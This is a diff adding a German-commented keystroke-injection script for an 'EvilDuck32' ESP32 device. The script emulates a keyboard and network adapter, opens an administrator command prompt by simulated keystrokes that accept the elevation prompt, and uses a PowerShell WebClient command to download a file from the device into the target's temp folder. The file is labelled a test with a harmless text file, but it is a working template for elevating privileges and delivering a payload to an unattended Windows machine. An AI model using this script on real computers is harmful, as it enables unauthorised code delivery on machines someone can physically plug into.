@@ -1,0 +1,49 @@
+REM ============================================================
+REM  EvilDuck32 – Payload Download Test (Windows)
+REM
+REM  Lädt eine Datei vom ESP32 (/sdcard/payloads/hello.txt)
+REM  per HTTP GET auf das Zielsystem herunter.
+REM
+REM  Voraussetzung auf SD-Card:
+REM    /sdcard/payloads/hello.txt  ← die zu übertragende Datei
+REM
+REM  Ergebnis auf Zielsystem:
+REM    %TEMP%\hello.txt
+REM ============================================================
+
+LOCALE DE
+VAR $PAYLOAD = hello.txt
+VAR $DEST = $env:TEMP+'\hello.txt'
+DEFAULTDELAY 500
+
+REM Schritt 1: RNDIS aktivieren und auf Verbindung warten
+ATTACKMODE HID RNDIS 30000
+
+REM Schritt 2: Kurz warten bis Windows die Verbindung stabilisiert hat
+DELAY 2000
+
+REM Schritt 3: cmd als Administrator öffnen
+WINDOWS
+STRING cmd
+DELAY 500
+RIGHT
+DOWN
+ENTER
+DELAY 1000
+LEFT
+ENTER
+DELAY 1500
+
+REM Schritt 4: Datei vom ESP32 herunterladen
+STRING powershell -Command "(New-Object Net.WebClient).DownloadFile('http://192.168.7.1/payload/$PAYLOAD', '$DEST')"
+ENTER
+DELAY 3000
+
+REM Schritt 5: Ergebnis prüfen
+STRING powershell -Command "if (Test-Path '$DEST') { Write-Host 'OK: Payload erhalten' } else { Write-Host 'FEHLER: Datei nicht gefunden' }"
+ENTER
+DELAY 2000
+
+REM Schritt 6: Fenster schließen
+STRING exit
+ENTER
